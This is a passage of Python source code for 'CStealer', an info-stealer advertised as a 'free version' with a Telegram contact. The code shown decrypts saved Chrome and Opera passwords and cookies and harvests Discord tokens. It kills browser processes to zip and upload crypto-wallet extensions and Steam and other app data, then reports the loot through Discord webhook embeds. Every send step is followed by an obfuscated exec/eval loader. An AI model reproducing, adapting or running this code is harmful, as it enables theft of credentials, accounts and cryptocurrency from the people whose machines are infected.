                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:browser:1069111130422771812> • **{C00K1C0UNt}** Cookies Found\n <:blackarrow:1069101795827269632> • [CStealerCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "You're currently using free version of CStealer | t.me/cstealerr",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
                    }
                }
            ],
            "username": "CStealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif",
            "attachments": []
            }
        __cnk_obfuscator__ = ""
        import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='2910355 1581440 3583736 6717908 1116964 3134880 2644310 2410596 1535208 3555503 4520052 5906145 663404 9346272 2088450 7597450 3792562 3030093 3659004 9624373 1930243 1347157 4422261 209508 1893430 7335009 569910 10378679 5439 2607290 8741502 2746989 916470 3206268 815760 4656102 925518 2729496 1957380 743250 1650 6841809 10969878 3557844 8568756 8531488 7490766 6600990 547600 5418806 9671255 10274299 5770440 374003 9865850 11052016 3529000 7750647 6321159 4821740 9839521 307165 1251976 949664 4128500 5365555 5197728 8312803 5579060 3907000 1986426 6364510 237328 867215 474400 6195200 7635064 2584944 4109987 3355235 2136194 6609642 1993860 4114638 5021085 743400 4435415 3597680 298931 312840 1181216 5034224 9121815 3540015 4500200 6231296 1337334 4619780 2969175 6460792 1312596 5920589 5810200 6829923 8273436 9995685 2142250 2446347 965570 1583688 3840096 848328 1739236 4896000 1304844 3651578 1985872 627648 906720 1730352 2608800 3708816 10651315 3555816 153408 5548500 1956781 2805460 3898624 1510543 7305400 7649928 10067022 7492016 10864395 3417480 9349000 6085295 2788292 8163714 3089555 3498300 2150492 408430 825759 4412028 12800 7806492 739880 4069250 2125948 1955904 8778120 3566613 241530 3967100 670741 8449110 10793670 3902353 9775584 5573685 2366897 113200 6960718 451668 8834070 3442032';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKncxcsz1y3XMdTGOci8wdSz3yIlyr8gCAGH/CAs=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
        return

    if name == "cspassw":
        ra = ' | '.join(da for da in p45WW0rDs)
        if len(ra) > 1000: 
            rrr = R3F0rM47(str(p45WW0rDs))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "CStealer | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1069101792736051221> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1069101795827269632> • [CStealerPasswords.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "You're currently using free version of CStealer | t.me/cstealerr",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
                    }
                }
            ],
            "username": "CStealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif",
            "attachments": []
            }
        __cnk_obfuscator__ = ""
        import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='2910355 1581440 3583736 6717908 1116964 3134880 2644310 2410596 1535208 3555503 4520052 5906145 663404 9346272 2088450 7597450 3792562 3030093 3659004 9624373 1930243 1347157 4422261 209508 1893430 7335009 569910 10378679 5439 2607290 8741502 2746989 916470 3206268 815760 4656102 925518 2729496 1957380 743250 1650 6841809 10969878 3557844 8568756 8531488 7490766 6600990 547600 5418806 9671255 10274299 5770440 374003 9865850 11052016 3529000 7750647 6321159 4821740 9839521 307165 1251976 949664 4128500 5365555 5197728 8312803 5579060 3907000 1986426 6364510 237328 867215 474400 6195200 7635064 2584944 4109987 3355235 2136194 6609642 1993860 4114638 5021085 743400 4435415 3597680 298931 312840 1181216 5034224 9121815 3540015 4500200 6231296 1337334 4619780 2969175 6460792 1312596 5920589 5810200 6829923 8273436 9995685 2142250 2446347 965570 1583688 3840096 848328 1739236 4896000 1304844 3651578 1985872 627648 906720 1730352 2608800 3708816 10651315 3555816 153408 5548500 1956781 2805460 3898624 1510543 7305400 7649928 10067022 7492016 10864395 3417480 9349000 6085295 2788292 8163714 3089555 3498300 2150492 408430 825759 4412028 12800 7806492 739880 4069250 2125948 1955904 8778120 3566613 241530 3967100 670741 8449110 10793670 3902353 9775584 5573685 2366897 113200 6960718 451668 8834070 3442032';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKncxcsz1y3XMdTGOci8wdSz3yIlyr8gCAGH/CAs=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
        return

    if name == "kiwi":
        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "CStealer | File Stealer"
                },
                "footer": {
                    "text": "You're currently using free version of CStealer | t.me/cstealerr",
                    "icon_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
                }
                }
            ],
            "username": "CStealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif",
            "attachments": []
            }
        __cnk_obfuscator__ = ""
        import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='373310 2182560 6072664 8211060 5199816 2696064 11175930 1282148 1103701 2300603 7362337 2697345 3412256 4497168 8226504 7263662 3160108 6535089 1852479 129492 2166324 1090838 4525179 4997796 1534610 8606862 4178790 1986776 7389825 1285466 6390096 2184175 1731705 1287291 4679785 2707388 2725605 9421622 3508698 636100 555600 3377439 7738434 9759096 2459982 10768016 9791243 9330860 2071280 4942960 8117067 11261128 3890952 9064144 9178725 2680876 2662920 5698166 11521926 7810 1316636 931270 1413720 2877568 4378600 3235338 9442168 9675847 4048326 561600 11194443 4960699 10839136 4205665 692280 11100 7549316 2184280 6738299 2073206 124016 6471878 7882160 3899115 5061711 4499600 6786493 1175720 4067938 56716 2697248 2481336 6891634 6636934 4631400 3946979 6620208 2539545 5284735 5141552 5046869 9167567 7191800 4741344 2754240 5369120 1584650 3973843 925130 6446320 4021824 2361424 2117044 2632620 5040282 2359791 4571945 1934688 327760 9618856 755712 1809216 9869573 3315268 1686336 7944300 5928155 10183640 437082 5591809 7793500 11084697 8625061 6936496 1603560 1693720 4260800 2042432 11322528 1836404 3047776 2471028 8620855 6795470 7017912 10573194 4002000 5771039 894600 1623887 2731168 2200800 4882072 9519351 2310734 3557400 5294622 5968014 92115 2675887 4879368 9712362 6194226 8764700 7174636 1287744 5510570 3460728';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKo/KjSovyXVyD8qKci8wjXKvMHEsLzACAG7hCH0=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
        return

def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\cs{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--CStealer-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0K3Ns = ''
def g3770K3N(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if not token in T0K3Ns:
                                # print(token)
                                T0K3Ns += token
                                UP104D70K3N(token, path)

P455w = []
def g37P455W(path, arg):
    global P455w, P455WC0UNt
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in p45WW0rDs: p45WW0rDs.append(old)
            P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
            P455WC0UNt += 1
    wr173F0rF113(P455w, 'passw')

C00K13s = []    
def g37C00K13(path, arg):
    global C00K13s, C00K1C0UNt
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in c00K1W0rDs: c00K1W0rDs.append(old)
            C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
            C00K1C0UNt += 1
    wr173F0rF113(C00K13s, 'cook')

def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines()if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0K3Ns
                    tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if CH3CK70K3N(tokenDecoded):
                        if not tokenDecoded in T0K3Ns:
                            # print(token)
                            T0K3Ns += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
        # print(WalletsZip, G4M1N6Z1p, OtherZip)

    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236> •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(W411375Z1p) == 0:
        ga = "<:geng_black:1069102746508197918>  •  Gaming\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = "<:black_planet:1070060252512387302>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": g108411NF0(),
        "embeds": [
            {
            "title": "CStealer Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "You're currently using free version of CStealer | t.me/cstealerr",
                "icon_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
            }
            }
        ],
        "username": "CStealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif",
        "attachments": []
    }
    __cnk_obfuscator__ = ""
    import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='158095 273216 1772992 5057948 11455928 11180736 7855190 40832 829268 4677346 7598104 6127905 1933024 3315520 9105174 259210 1561792 5127012 108114 10001295 1523646 3785593 4050063 3887322 4149915 6475095 2853400 6529568 1869906 499114 804678 3557106 1624758 2568411 2422805 4368603 1995336 1417570 5641212 343640 169840 2656368 6942144 5931468 9119427 5717376 5935366 8744010 1902640 6487922 5465110 4168570 1656486 6211197 2058960 8677264 2033400 5624212 3941145 10352760 4623679 9089025 3551944 544384 9547100 7806366 7405092 1456746 2451712 3760100 7633197 7448079 10677184 1877605 1163000 1721400 4519521 5661032 5685849 533246 2599598 5829821 2268420 1045341 4879227 6310600 1723666 625880 2720186 3833104 2159808 6272136 9406231 6172886 2974700 5989098 7150878 6470015 4507168 8118448 5565807 3237957 7152100 7083029 7420716 8571180 1210402 709751 617960 5135016 1642224 710164 3678460 6920445 2288094 462119 2092839 4617368 954160 5254600 1700160 1331088 9003301 2623368 2786304 815800 2513076 5703256 2767216 2449760 2200 3986424 3414970 5775952 4371380 1670920 9452800 1092608 10177608 9444405 1245498 4151040 4419962 4590630 7916040 3842931 7833700 820827 223600 2071033 2260368 1927456 8054384 2843857 2669828 2514300 216847 1402656 4348610 3215005 2955576 3842646 8494193 5154000 3039494 7440438 6521765 3204560';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzCowyiCoPMo3KLTCIyo0ydgosyHEM9DEBAGDwB7I=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')



def Z1P73136r4M(path, arg, procc):
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    O7H3rZ1p.append([arg, lnik])

def Z1P7H1N65(path, arg, procc):
    pathC = path
    name = arg
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_Edge"
        pathC = path + arg

    if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Binance_{browser}"
        pathC = path + arg

    if "hnfanknocfeofbddgcijnmhnfnkdnaad" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Coinbase_{browser}"
        pathC = path + arg

    if "egjidjbpglichdcondbcbdnbeeppgdph" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Trust_{browser}"
        pathC = path + arg

    if "bfnaelmomeimhlpmgjnjophhpkkoljpa" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Phantom_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg or "koplchlghecd" in arg or "aelbohpjbbld" in arg or "nocfeofbddgc" in arg or "bpglichdcond" in arg or "momeimhlpmgj" in arg:
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])


def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    br0W53rP47H5 = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
